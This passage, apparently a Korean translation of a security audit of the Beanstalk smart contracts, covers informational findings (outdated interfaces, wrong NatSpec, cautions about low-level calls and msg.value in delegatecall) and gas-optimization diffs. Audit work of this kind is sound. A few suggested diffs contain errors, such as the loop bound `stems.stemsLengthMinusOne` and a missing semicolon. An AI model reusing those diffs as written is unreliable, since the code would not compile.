-        uint32[] calldata seasons,
+        int96[] calldata stems,
        uint256[] calldata amounts
    ) external payable returns (uint256[] memory bdvs);

    ...

    function convert(
        bytes calldata convertData,
-        uint32[] memory crates,
+        int96[] memory stems,
        uint256[] memory amounts
    ) external payable returns (int96 toStem, uint256 fromAmount, uint256 toAmount, uint256 fromBdv, uint256 toBdv);

    function getDeposit(
        address account,
        address token,
-        uint32 season
+        int96 stem
    ) external view returns (uint256, uint256);
```


### `Weather::handleRain`의 레거시 출금 대기열 로직이 업데이트되어야 함

`Weather::handleRain`에는 업데이트된 로직을 반영하도록 수정되어야 하는 레거시 출금 대기열과 관련된 [조건](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Weather.sol#L239-L241)이 포함되어 있습니다. 이는 최신 커밋에서 수정된 것으로 이해됩니다.


### `Depot`에 온체인 배포에 존재하는 함수가 누락됨

`Depot` 컨트랙트는 이미 [배포되어](https://etherscan.io/address/0xDEb0f00071497a5cc9b4A6B96068277e57A82Ae2) 사용 중입니다. 그러나 이 배포된 버전에는 현재 커밋 해시의 컨트랙트에서 누락된 `receive` 및 `version` 함수가 포함되어 있습니다. 컨트랙트가 업데이트되었으며 최신 커밋에서 이러한 함수가 추가된 것으로 이해됩니다.


### 섀도잉된 `Prices` 구조체 선언이 해결되어야 함

`P.sol`과 `BeanstalkPrice` 모두 비슷한 형식의 `Prices` 구조체를 선언합니다. `P.sol`에 현재 존재하는 버전은 `BeanstalkPrice`의 버전을 선호하여 다음과 같이 수정되어야 하며, `BeanstalkPrice`의 버전은 제거될 수 있습니다:

```diff
    struct Prices {
-       address pool;
-       address[] tokens;
        uint256 price;
        uint256 liquidity;
        int deltaB;
        P.Pool[] ps;
    }
```


### `Root.sol`은 최근 Beanstalk 변경 사항과 호환되도록 업데이트되어야 함

`Root.sol`은 핵심 Beanstalk 시스템의 최근 변경 사항과의 비호환성으로 인해 전체가 주석 처리된 것으로 이해됩니다. 업그레이드 가능한 Root 컨트랙트가 다시 Beanstalk의 현재 반복과 호환되고 사용자가 의도한 대로 래핑된 Silo 예금과 상호 작용할 수 있도록 이를 해결해야 합니다.


### `AppStorage`의 부정확한 NatSpec 주석

[`AppStorage::SiloSettings`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L373) 구조체 내에 토큰의 Bean Denominated Value(BDV)를 계산하기 위해 `delegatecall` 사용을 참조하는 [주석](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L381-L385)이 있습니다. 이는 올바르지 않습니다. 이는 [`tokenToBdv`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L368C18-L368C28)가 아니라 [`BDVFacet`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/BDVFacet.sol#L18)에 포함된 서명 중 하나에 해당하는 선택자에 대한 [`staticcall`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L287)입니다.

다른 부정확한 내용들이 [`AppStorage::AppStorage`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L441-L550) 및 [`AppStorage::State`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/AppStorage.sol#L86-L160) 구조체에 존재하며, 여기서 멤버가 문서에서 누락되었거나 후속 선언을 반영하지 않는 순서로 문서화되었습니다. 일관성을 유지하고 혼란을 최소화하기 위해 신중하게 확인하고 업데이트해야 합니다.


### 새롭거나 기존의 저수준 호출을 수정하는 향후 컨트랙트 업그레이드에 각별한 주의를 기울여야 함

`LibDiamond::enforceIsOwnerOrContract`를 사용하는 함수에 대한 호출이 Beanstalk에서 시작된 것처럼 보이도록 조작될 수 없도록 저수준 호출(low-level calls)을 활용하는 새로운 기능을 Beanstalk에 도입할 때 주의해야 합니다. 이를 통해 호출자는 이 확인을 우회하여 `UnripeFacet`, `PauseFacet`, `FundraiserFacet` 및 `WhitelistFacet`의 특권 함수에 접근할 수 있습니다. 이것이 즉시 악용 가능한 것으로 보이지는 않지만, 성공적인 악용을 위해서는 Beanstalk 내의 임의의 외부 호출이나 Beanstalk Diamond가 `msg.sender`인 저수준 호출 후 Beanstalk 컨텍스트에서의 `delegateCall`에 접근해야 함을 이해하는 것이 중요합니다. 반복하자면, 특히 `DepotFacet`, `FarmFacet`, `Pipeline` 및 `LibETH`/`LibWETH`와 함께 사용하는 것을 고려할 때, 안전하지 않은 임의의 외부 호출을 도입할 수 있는 향후 업그레이드 추가 사항의 함의에 특별한 주의를 기울여야 합니다.


### 람다(Lambda) 변환 로직은 계속 개선되어야 함

`LibConvertData::ConvertKind` 열거형 타입 [`LAMBDA_LAMBDA`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Convert/LibConvertData.sol#L17)의 목적은 소유자가 먼저 해당 예금을 인출하도록 강제하지 않고 예금의 Bean Denominated Value(BDV)를 업데이트할 수 있도록 하는 것입니다. 인출은 예금의 자란 Stalk를 포기해야 하는 바람직하지 않은 부작용이 있습니다. [`ConvertFacet::convert`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ConvertFacet.sol#L71)를 통해 [`LibLambdaConvert::convert`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Convert/LibLambdaConvert.sol#L15-L28)를 호출할 때 토큰 `amountIn`과 `amountOut`은 동일하며, 이는 기존 토큰 금액에 해당하는 예금에 대한 [새로운 BDV](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ConvertFacet.sol#L85)를 계산합니다. 언급했듯이, 이를 통해 사용자는 먼저 예금을 인출하지 않고도 하방으로 오래되었을 수 있는 예금의 BDV를 업데이트할 수 있습니다. 그러나 마찬가지로, 예금의 BDV가 실제보다 높은 방식으로 오래되었을 수도 있습니다. 이 경우, 사용자는 현재 시장 상황을 감안할 때 실제로 받아야 할 것보다 더 많은 시뇨리지(seignorage) 혜택을 받기 때문에 예금에 대해 람다 변환을 수행할 유인이 없습니다. 현재로서는 예금의 BDV가 [감소하는 것이 불가능](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ConvertFacet.sol#L85)하지만, 임의의 호출자가 이러한 방식으로 오래된 주어진 계정의 예금에 대해 람다 변환을 시작할 수 있도록 허용하는 게임 이론적 솔루션이 구현될 예정인 것으로 이해됩니다. 이 문제를 처리하기 위한 다른 방법을 모색하는 동안 임시 조치로 이 솔루션을 구현하는 것이 좋습니다.


### 컨트랙트 업그레이드는 `msg.value`가 `delegatecall`을 통해 지속된다는 점을 고려해야 함

`msg.value`가 `delegatecall`을 통해 지속된다는 점을 감안할 때, 향후 컨트랙트 업그레이드에서 이 값을 안전하지 않게 사용할 수 있는 루프 내에서 이 동작이 무기화될 가능성을 고려하는 것이 중요합니다. 이것이 즉시 악용 가능한 것으로 보이지는 않지만, 이전에 [실제 사례에서 발견된](https://samczsun.com/two-rights-might-make-a-wrong/) 다른 변형들이 있습니다. 반복하자면, 특히 `DepotFacet`, `FarmFacet`, `Pipeline` 및 `LibETH`/`LibWETH`의 저수준 호출과 함께 사용하는 것을 고려할 때, 루프 내에서 `msg.value`의 안전하지 않은 사용을 도입할 수 있는 향후 업그레이드 추가 사항의 함의에 특별한 주의를 기울여야 합니다.

\clearpage
## 가스 최적화


### 불필요한 `SafeMath` 연산 사용 방지

다음과 같이 `SafeMath` 연산 사용을 피하여 가스를 절약할 수 있는 여러 인스턴스가 확인되었습니다. 이는 값이 이미 검증되었거나 오버플로우되지 않도록 보장되기 때문입니다:

```solidity
File: /beanstalk/farm/TokenFacet.sol

151:        currentAllowance.sub(subtractedValue)
```

```solidity
File: /beanstalk/market/Listing.sol

194:        l.amount.sub(amount),

220:        l.amount.sub(amount),
```

```solidity
File: /libraries/Token/LibTransfer.sol

69:                token.balanceOf(address(this)).sub(beforeBalance)
```

```solidity
File: /libraries/Silo/LibSilo.sol

264:        s.a[account].roots = s.a[account].roots.sub(roots);
```


### 계정의 델타 루트를 재설정할 때 `Silo::_plant`의 중복 로직

`Silo::_plant`를 실행할 때 계정의 델타 루트를 [0으로 재설정](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/SiloFacet/Silo.sol#L111)해야 합니다. 그렇지 않으면 `SiloExit::_balanceOfEarnedBeans`가 잘못된 양의 beans를 반환합니다. 이 로직은 현재 `LibTokenSilo::addDepositToAccount`를 호출한 후 [반복](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/SiloFacet/Silo.sol#L127)되는데, 이 함수 내에서는 계정의 델타 루트에 접근하지 않으므로 중복 할당을 제거할 수 있습니다.

```diff
        // Silo::_plant
        s.a[account].deltaRoots = 0; // must be 0'd, as calling balanceOfEarnedBeans would give a invalid amount of beans.
        if (beans == 0) return (0,stemTip);

        // Reduce the Silo's supply of Earned Beans.
        // SafeCast unnecessary because beans is <= s.earnedBeans.
        s.earnedBeans = s.earnedBeans.sub(uint128(beans));

        // Deposit Earned Beans if there are any. Note that 1 Bean = 1 BDV.
        LibTokenSilo.addDepositToAccount(
            account,
            C.BEAN,
            stemTip,
            beans, // amount
            beans, // bdv
            LibTokenSilo.Transfer.emitTransferSingle
        );
-       s.a[account].deltaRoots = 0; // must be 0'd, as calling balanceOfEarnedBeans would give a invalid amount of beans.
```


### 제수가 0이 될 수 없는 경우 `SafeMath::div` 사용 방지

`SafeMath::div`의 사용은 제수가 0이 될 수 있는 경우에만 필요합니다. 따라서 제수가 0이 될 수 없다면 이 함수의 사용을 피할 수 있습니다. 다음과 같은 경우가 확인되었습니다:

```solidity
File: /beanstalk/barn/FertilizerFacet.sol

45:        uint128 remaining = uint128(LibFertilizer.remainingRecapitalization().div(1e6)); // remaining <= 77_000_000 so downcasting is safe.

52:        ).div(1e6)); // return value <= amount, so downcasting is safe.
```

```solidity
File: /beanstalk/diamond/PauseFacet.sol

42:        timePassed = (timePassed.div(3600).add(1)).mul(3600);
```

```solidity
File: /beanstalk/field/FieldFacet.sol

344:            LibDibbler.morningTemperature().div(LibDibbler.TEMPERATURE_PRECISION)
```

```solidity
File: /beanstalk/market/MarketFacet/Order.sol

105:        uint256 costInBeans = amount.mul(o.pricePerPod).div(1000000);

197:        beanAmount = beanAmount.div(1000000);
```

```solidity
File: /beanstalk/metadata/MetadataImage.sol

167:        uint256 totalSprouts = uint256(stalkPerBDV).div(STALK_GROWTH).add(16);
168:        uint256 numRows = uint256(totalSprouts).div(4).mod(4);

596:        numStems = uint256(grownStalkPerBDV).div(STALK_GROWTH);
597:        plots = numStems.div(16).add(1);
```

```solidity
File: /beanstalk/silo/SiloFacet/SiloExit.sol

205:        beans = (stalk - accountStalk).div(C.STALK_PER_BEAN); // Note: SafeMath is redundant here.
```

```solidity
File: /beanstalk/sun/SeasonFacet/SeasonFacet.sol

139:        .div(C.BLOCK_LENGTH_SECONDS);
```

```solidity
File: /beanstalk/sun/SeasonFacet/Sun.sol

121:        uint256 maxNewFertilized = amount.div(FERTILIZER_DENOMINATOR);

167:        newHarvestable = amount.div(HARVEST_DENOMINATOR);

227:        uint256 newSoil = newHarvestable.mul(100).div(100 + s.w.t);

229:            newSoil = newSoil.mul(SOIL_COEFFICIENT_HIGH).div(C.PRECISION); // high podrate

231:            newSoil = newSoil.mul(SOIL_COEFFICIENT_LOW).div(C.PRECISION); // low podrate
```

```solidity
File: /ecosystem/price/CurvePrice.sol

47:        rates[0] = rates[0].mul(pool.price).div(1e6);
```

```solidity
File: /libraries/Convert/LibMetaCurveConvert.sol

36:        return balances[1].mul(C.curve3Pool().get_virtual_price()).div(1e30);

86:            dy_0.sub(dy).mul(ADMIN_FEE).div(FEE_DENOMINATOR)
```

```solidity
File: /libraries/Curve/LibBeanMetaCurve.sol

114:        balance0 = xp0.div(RATE_MULTIPLIER);
```

```solidity
File: /libraries/Curve/LibCurve.sol

160:        xp[1] = balances[1].mul(rate).div(PRECISION);

171:        xp[0] = balances[0].mul(rates[0]).div(PRECISION);
172:        xp[1] = balances[1].mul(rates[1]).div(PRECISION);
```

```solidity
File: /libraries/Minting/LibMinting.sol

22:        int256 maxDeltaB = int256(C.bean().totalSupply().div(MAX_DELTA_B_DENOMINATOR));
```

```solidity
File: /libraries/Oracle/LibChainlinkOracle.sol

63:            return uint256(answer).mul(PRECISION).div(10**decimals);
```

```solidity
File: /libraries/Oracle/LibEthUsdOracle.sol

58:            return chainlinkPrice.add(usdcPrice).div(2);

68:                return chainlinkPrice.add(usdtPrice).div(2);

74:                return chainlinkPrice.add(usdcPrice).div(2);
```

```solidity
File: /libraries/Silo/LibLegacyTokenSilo.sol

143:             uint256 removedBDV = amount.mul(crateBDV).div(crateAmount);
```

```solidity
File: /libraries/Silo/LibSilo.sol

493:                   plentyPerRoot.mul(s.a[account].sop.roots).div(
494:                       C.SOP_PRECISION
495:                   )


507:               plentyPerRoot.mul(s.a[account].roots).div(
508:                   C.SOP_PRECISION
509:                )
```

```solidity
File: /libraries/Silo/LibTokenSilo.sol

390:        ).div(1e6); //round here

460:        int96 grownStalkPerBdv = bdv > 0 ? toInt96(grownStalk.div(bdv)) : 0;
```

```solidity
File: /libraries/Silo/LibUnripeSilo.sol

131:            .add(legacyAmount.mul(C.initialRecap()).div(1e18));

201:            .div(C.precision());

246:            .div(1e18);

267:        ).mul(AMOUNT_TO_BDV_BEAN_LUSD).div(C.precision());

288:        ).mul(AMOUNT_TO_BDV_BEAN_3CRV).div(C.precision());
```

```solidity
File: /libraries/Decimal.sol

228:        return self.value.div(BASE);
```

```solidity
File: /libraries/LibFertilizer.sol

80:            newDepositedBeans = newDepositedBeans.mul(percentToFill).div(
81:                C.precision()
82:            );

86:        uint256 newDepositedLPBeans = amount.mul(C.exploitAddLPRatio()).div(
87:            DECIMALS
88:        );

145:            .div(DECIMALS);
```

```solidity
File: /libraries/LibFertilizer.sol

99:            BASE_REWARD + gasCostWei.mul(beanEthPrice).div(1e18), // divide by 1e18 to convert wei to eth

230:        return beans.mul(scaler).div(FRAC_EXP_PRECISION);
```

```solidity
File: /libraries/LibPolynomial.sol

77:                positiveSum = positiveSum.add(pow(x, degree).mul(significands[degree]).div(pow(10, exponents[degree])));

79:                negativeSum = negativeSum.add(pow(x, degree).mul(significands[degree]).div(pow(10, exponents[degree])));

124:                positiveSum = positiveSum.add(pow(end, 1 + degree).mul(significands[degree]).div(pow(10, exponents[degree]).mul(1 + degree)));

126:                positiveSum = positiveSum.sub(pow(start, 1 + degree).mul(significands[degree]).div(pow(10, exponents[degree]).mul(1 + degree)));

128:                negativeSum = negativeSum.add(pow(end, 1 + degree).mul(significands[degree]).div(pow(10, exponents[degree]).mul(1 + degree)));

130:                negativeSum = negativeSum.sub(pow(start, 1 + degree).mul(significands[degree]).div(pow(10, exponents[degree]).mul(1 + degree)));
```


### `SiloFacet:transferDeposits`에서 루핑 시 `msg.sender`와의 반복 비교 방지

현재 `SiloFacet:transferDeposits`는 모든 루프 반복에서 동일한 비교를 수행하지만, 이는 for 루프 외부에서 한 번만 수행할 수 있습니다:

```diff
// SiloFacet:transferDeposits
//...
+       bool callerIsNotSender = sender != msg.sender;
        for (uint256 i = 0; i < amounts.length; ++i) {
            require(amounts[i] > 0, "Silo: amount in array is 0");
-           if (sender != msg.sender) {
+           if (callerIsNotSender) {
                LibSiloPermit._spendDepositAllowance(sender, msg.sender, token, amounts[i]);
            }
        }
//...
```

대안으로, 이 케이스를 더 효율적으로 처리하기 위해 로직을 두 개의 별도 for 루프로 나눌 수 있습니다:

```diff
// SiloFacet:transferDeposits
//...
+   if (sender != msg.sender){
        for (uint256 i = 0; i < amounts.length; ++i) {
            require(amounts[i] > 0, "Silo: amount in array is 0");
-           if (sender != msg.sender) {
                LibSiloPermit._spendDepositAllowance(sender, msg.sender, token, amounts[i]);
-           }
        }
+   } else {
+       for (uint256 i = 0; i < amounts.length; ++i) {
+           require(amounts[i] > 0, "Silo: amount in array is 0");
+       }
+   }
//...
```


### `EnrootFacet::enrootDeposits`에서 Stems를 루핑할 때 마지막 요소에 대한 로직 추출

현재 `EnrootFacet::enrootDeposits`에서 Stems를 루핑할 때 각 반복 중에 `i+1 == stems.length` [조건](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/EnrootFacet.sol#L139)이 확인됩니다. 아래와 같이 이를 수정하여 가스를 절약할 수 있습니다:

```diff
// EnrootFacet::enrootDeposits
//...
+       uint256 stemsLengthMinusOne = stems.length - 1;
-       for (uint256 i; i < stems.length; ++i) {
+       for (uint256 i; i < stems.stemsLengthMinusOne; ++i) {
-           if (i+1 == stems.length) {
-               // Ensure that a rounding error does not occur by using the
-               // remainder BDV for the last Deposit.
-               depositBdv = newTotalBdv.sub(bdvAdded);
-           } else {
                // depositBdv is a proportional amount of the total bdv.
                // Cheaper than calling the BDV function multiple times.
                depositBdv = amounts[i].mul(newTotalBdv).div(ar.tokensRemoved);
-           }
            LibTokenSilo.addDepositToAccount(
                msg.sender,
                token,
                stems[i],
                amounts[i],
                depositBdv,
                LibTokenSilo.Transfer.noEmitTransferSingle
            );

            stalkAdded = stalkAdded.add(
                depositBdv.mul(_stalkPerBdv).add(
                    LibSilo.stalkReward(
                        stems[i],
                        _lastStem,
                        uint128(depositBdv)
                    )
                )
            );

            bdvAdded = bdvAdded.add(depositBdv);
        }
+       depositBdv = newTotalBdv.sub(bdvAdded);
+       LibTokenSilo.addDepositToAccount(
+           msg.sender,
+           token,
+           stems[stemsLengthMinusOne],
+           amounts[stemsLengthMinusOne],
+           depositBdv,
+           LibTokenSilo.Transfer.noEmitTransferSingle
+       );
+
+       stalkAdded = stalkAdded.add(
+           depositBdv.mul(_stalkPerBdv).add(
+               LibSilo.stalkReward(
+                   stems[stemsLengthMinusOne],
+                   _lastStem,
+                   uint128(depositBdv)
+               )
+           )
+       );
+
+       bdvAdded = bdvAdded.add(depositBdv);
//...
```


### `LibSilo::_mow`의 중복 조건 제거 가능

`LibSilo::_mow` 내에는 Flood 로직을 처리하기 전에 주어진 계정에 대한 마지막 업데이트에 대해 일부 유효성 검사를 수행하는 [라인](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L355)이 있습니다. 계정의 마지막 업데이트는 Season of Plenty (sop) 보상 자격을 얻으려면 최소한 비가 내리기 시작한 시즌과 같아야 합니다. 또한 마지막 업데이트가 현재 시즌보다 작거나 같다는 추가 유효성 검사가 있는데, 현재 시즌을 초과하여 계정을 업데이트하는 것은 [불가능하므로](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibSilo.sol#L372) 이는 항상 해당됩니다. 따라서 이 조건은 다음과 같이 제거할 수 있습니다:

```diff
- if (lastUpdate <= s.season.rainStart && lastUpdate <= s.season.current) {
+ if (lastUpdate <= s.season.rainStart) {
```


### `LibTokenSilo::calculateGrownStalkAndStem`이 `grownStalk` 매개변수에 대해 중복 계산을 수행하는 것으로 보임

[`LibTokenSilo::calculateGrownStalkAndStem`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L433-L441)은 현재 자란 stalk와 Bean Denominated Value(BDV)를 설명하면서 발행될 자란 stalk와 해당 예금이 생성될 stem 인덱스를 계산할 때 [`ConvertFacet::_depositTokensForConvert`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/silo/ConvertFacet.sol#L209)에서 사용됩니다. 반올림이 없다고 가정하면 `grownStalk`에 대해 수행된 계산은 중복인 것으로 보입니다:

$\text{stem} = \text{\_stemTipForToken} - \frac{\text{grownStalk}}{\text{bdv}}$

$\text{\_grownStalk} = (\text{\_stemTipForToken} - \text{stem}) \times \text{bdv}$

$= (\text{\_stemTipForToken} - (\text{\_stemTipForToken} - \frac{\text{grownStalk}}{\text{bdv}})) \times \text{bdv}$

$= \frac{\text{grownStalk}}{\text{bdv}} \times \text{bdv}$

$= \text{grownStalk}$

$\therefore \text{\_grownStalk} \equiv \text{grownStalk}$

따라서 다음 수정을 수행하는 것이 좋습니다:

```diff
    // LibTokenSilo.sol
    function calculateGrownStalkAndStem(address token, uint256 grownStalk, uint256 bdv)
        internal
        view
        returns (uint256 _grownStalk, int96 stem)
    {
        int96 _stemTipForToken = stemTipForToken(token);
        stem = _stemTipForToken.sub(toInt96(grownStalk.div(bdv)));
-       _grownStalk = uint256(_stemTipForToken.sub(stem).mul(toInt96(bdv)));
+       _grownStalk = grownStalk;
    }
```


### `Sun::rewardToHarvestable`의 삼항 연산자 간소화 가능

[`Sun::rewardToHarvestable`](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Sun.sol#L162-L172)에서 `newHarvestable` 변수는 이 값을 초과하면 `notHarvestable`로 [재할당](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/beanstalk/sun/SeasonFacet/Sun.sol#L168-L170)되어, 보상 금액이 충분히 커서 Pod 라인의 모든 미결 Pods가 수확 가능하게 되는 경우 Harvestable 인덱스가 Pod 인덱스를 초과하는 것을 방지하는 캡 역할을 합니다. 그렇지 않아서 Pod 라인에 수확할 수 없는 Pods가 남아 있는 경우, 삼항 연산자에 의해 기존 `newHarvestable` 값으로 재할당이 이루어집니다. 이 분기는 필요하지 않으며 제거할 수 있습니다:

```diff
    newHarvestable = amount.div(HARVEST_DENOMINATOR);
-   newHarvestable = newHarvestable > notHarvestable
-       ? notHarvestable
-       : newHarvestable;
+   if (newHarvestable > notHarvestable) {
+       newHarvestable = notHarvestable;
+   }
```


### `LibCurveMinting::check`에서 `deltaB`를 기본값으로 불필요하게 재할당

마지막 일출 이후 BEAN/3CRV 메타풀의 시간 가중 평균 `deltaB`를 반환할 때, `LibCurveMinting::check`는 Curve 오라클이 초기화되지 않은 경우 불필요하게 `deltaB`를 기본 `int256` 값(0)으로 재할당합니다. `deltaB`는 함수 서명 반환 값에 선언되어 있고 이 재할당 전에 다른 곳에서는 사용되지 않으므로 이 분기를 제거할 수 있습니다:

```diff
    if (s.co.initialized) {
        (deltaB, ) = twaDeltaB();
-   } else {
-       deltaB = 0;
    }
```


### `lastUpdate == stemStartSeason`일 때 `LibLegacyTokenSilo:: balanceOfGrownStalkUpToStemsDeployment` 실행이 더 일찍 종료될 수 있음

현재 `LibLegacyTokenSilo:: balanceOfGrownStalkUpToStemsDeployment`는 마지막 업데이트 시즌이 Stems 배포 시즌보다 큰 경우 [0을 반환](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibLegacyTokenSilo.sol#L188)합니다. 이는 계정이 이미 빚진 자란 Stalk를 크레딧으로 받았음을 의미하기 때문입니다. 계정의 Seeds에 0의 시즌 차이를 [곱하면](https://github.com/BeanstalkFarms/Beanstalk/blob/c7a20e56a0a6659c09314a877b440198eff0cd81/protocol/contracts/libraries/Silo/LibLegacyTokenSilo.sol#L220) 미결 자란 Stalk가 0이 되므로 마지막 업데이트 시즌이 Stems 배포 시즌과 같을 때도 이 최적화를 수행할 수 있습니다.

```diff
- if (lastUpdate > stemStartSeason) return 0;
+ if (lastUpdate >= stemStartSeason) return 0;
```


### 불필요한 스토리지 접근을 피하기 위해 상태 변수를 캐시해야 함

아래와 같이 `s.season.current`를 캐시하여 스토리지 접근을 한 번 절약할 수 있습니다:
```diff
    // SeasonFacet.sol
    function stepSeason() private {
+       uint32 _current = s.season.current + 1
        s.season.timestamp = block.timestamp;
-       s.season.current += 1;
+       s.season.current = _current ;
        s.season.sunriseBlock = uint32(block.number); // Note: Will overflow in the year 3650.
-       emit Sunrise(season());
+       emit Sunrise(_current );
    }
```

\clearpage

